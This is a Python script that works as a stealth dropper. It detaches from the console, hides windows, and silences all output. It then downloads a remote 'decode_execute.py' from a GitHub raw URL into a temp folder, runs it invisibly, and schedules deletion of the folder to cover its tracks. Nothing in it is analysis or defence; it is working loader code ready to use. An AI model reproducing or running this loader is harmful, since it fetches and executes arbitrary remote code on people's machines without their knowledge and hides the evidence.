import os
import sys
import urllib.request
import tempfile
import subprocess
import time
import shutil

def run_silently():
    """Run in complete stealth mode (no windows/popups)"""
    if os.name == 'nt':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        subprocess.Popen(
            [sys.executable, __file__],
            creationflags=subprocess.CREATE_NO_WINDOW,
            startupinfo=startupinfo,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        sys.exit(0)
    else:
        if os.fork():
            sys.exit(0)
        os.setsid()
        os.umask(0)
        null_fd = os.open(os.devnull, os.O_RDWR)
        for fd in range(3):
            os.dup2(null_fd, fd)
        os.close(null_fd)

def download_content(url, max_retries=5):
    """Download content with robust error handling"""
    for attempt in range(max_retries):
        try:
            with urllib.request.urlopen(url, timeout=30) as response:
                return response.read()
        except:
            if attempt < max_retries - 1:
                time.sleep(2 * (attempt + 1))
    return None

def save_to_tempfile(content):
    """Save content securely to temporary file"""
    temp_dir = tempfile.mkdtemp()
    file_path = os.path.join(temp_dir, "decoder.py")
    try:
        with open(file_path, 'wb') as f:
            f.write(content)
        return file_path
    except:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return None

def execute_script(script_path):
    """Execute script with guaranteed resource cleanup"""
    try:
        if os.name == 'nt':
            process = subprocess.Popen(
                [sys.executable, script_path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            process = subprocess.Popen(
                [sys.executable, script_path],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        
        # Allow process to start before cleaning up
        time.sleep(10)
        return True
    except:
        return False
    finally:
        # Schedule directory cleanup
        temp_dir = os.path.dirname(script_path)
        if os.name == 'nt':
            subprocess.Popen(
                f"timeout 15 & rmdir /s /q \"{temp_dir}\"",
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                f"sleep 15; rm -rf \"{temp_dir}\"",
                shell=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

def main():
    """Main execution with guaranteed operation"""
    # First run: activate stealth mode
    if not os.environ.get('_LOADER_MODE'):
        os.environ['_LOADER_MODE'] = '1'
        run_silently()
    
    # Configuration - Update this URL
    DECODER_URL = "https://raw.githubusercontent.com/d-x3n0n/t3n3t/main/const/decode_execute.py"
    
    # Download content
    decoder_content = download_content(DECODER_URL)
    if not decoder_content:
        sys.exit(1)
    
    # Save to temp file
    decoder_path = save_to_tempfile(decoder_content)
    if not decoder_path:
        sys.exit(2)
    
    # Execute decoder
    execute_script(decoder_path)
    sys.exit(0)

if __name__ == "__main__":
    # Suppress all output
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    main()
